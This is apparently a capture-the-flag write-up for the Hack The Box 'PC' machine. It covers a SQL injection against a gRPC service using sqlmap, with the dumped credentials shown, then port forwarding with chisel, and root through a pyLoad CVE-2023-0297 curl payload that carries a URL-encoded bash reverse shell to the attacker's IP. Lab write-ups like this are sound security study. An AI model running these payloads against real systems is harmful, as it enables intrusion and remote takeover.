# HTB - PC

## Summary

This was an active 'easy' box. The initial foothold took me a long time, because it was hard to figure out how to communicate with the grpc service running on port 50051. Then its just a simple sql injection. The privilege escalation is an easy exploit of a CVE

<br />

## Interacting with gRPC

nmap (with `-p-` option) tells us port `22` and port `50051` are open  
Googling port `50051` tells us that this is a common port to use with `gRPC`  
`gRPC` is a Remote Procedure Call framework that can run on any environment. An RPC is basically like an API  
There are a lot of tools for interacting with gRPC but `grpcui` worked best for me  
Installation:  
- `git clone https://github.com/fullstorydev/grpcui`  
- `cd grpcui`  
- `go install .` - Don't know if this is necessary  
- `make install`  

Usage:  
- `~/go/bin/grpcui -plaintext 10.10.11.214:50051`  

This enables us to interact with the gRPC service in a Web UI  

We can use the "RegisterUser" method to create ourselves a new user, and LoginUser to login as that user, which gives us back a token  
We can then use the "getInfo" method with a Metadata field: `token:eyJ0eXAiOiJKV1QiL...` and `id:1` in the request data, and we get back the message: "The admin is working hard to fix the issues."  
If we put `1;whoami` in the id field instead, we get back "sqlite3.Warning: You can only execute one statement at a time"  
This indicates the sqlite3 database the gRPC application is using may be vulnerable to sql injection  

<br />

## SQL Injection

We can intercept the HTTP request with burp and save the request as `pc_grpc.req`  
**Note:** We can only intercept the HTTP request with burp because we are using `grpcui` which (I think) wraps the gRPC requests in HTTP requests  

Then, we can run:  
`sqlmap -r pc_grpc.req -p id`  
Which tells us that the back end DBMS is SQLite which lines up with our current understanding  
sqlmap also tells us that the `id` parameter is vulnerable to a boolean-based blind and a Generic UNION query  
We like the Generic UNION query option more, so:  
`sqlmap -r pc_grpc.req -p id --technique=U --batch --dump`  
- `--batch` means dont ask for user input, just use the default  
- `--technique=U` means use only the UNION query technique  

From this, we get a dump of the database including: 

```
admin:admin
sau:HereIsYourPassWord1431
```

We are able to ssh in as the sau user

<br />

## Privilege Escalation

I brought linpeas over to the target and in the "Active Ports" section, we find that 127.0.0.1:8000 is open and listening  
We can bring chisel over and use it to forward requests from our attack box to that service:  
On attack box:  
- `./chisel server --reverse -v -p 8688`  

On target:  
- `./chisel client 10.10.14.3:8688 R:127.0.0.1:8001:127.0.0.1:8000 &`  

This will forward connections to our attack box's `127.0.0.1:8001` to `127.0.0.1:8000` on the target  

Going to a browser on our attack box and going to `127.0.0.1:8001` brings us to a `pyLoad` login page  

pyLoad is vulnerable to `CVE-2023-0297` which is an unauthenticated RCE vulnerability  
We can see the poc at: https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad  

Basically, we can run:  
```bash
curl -i -s -k -X $'POST' --data-binary $'jk=pyimport%20os;os.system(\"<put url encoded command here>\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' $'http://<target>/flash/addcrypted2'
```
and the command specified will be executed  
In this case, I url-encoded the command `bash -c 'bash -i >& /dev/tcp/10.10.14.3/8686 0>&1'` to create the final command:  
```bash
curl -i -s -k -X $'POST' --data-binary $'jk=pyimport%20os;os.system(\"%20bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.3%2F8686%200%3E%261%27\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' $'http://127.0.0.1:8001/flash/addcrypted2'
```

With a netcat listener on `8686` we get a shell as root  
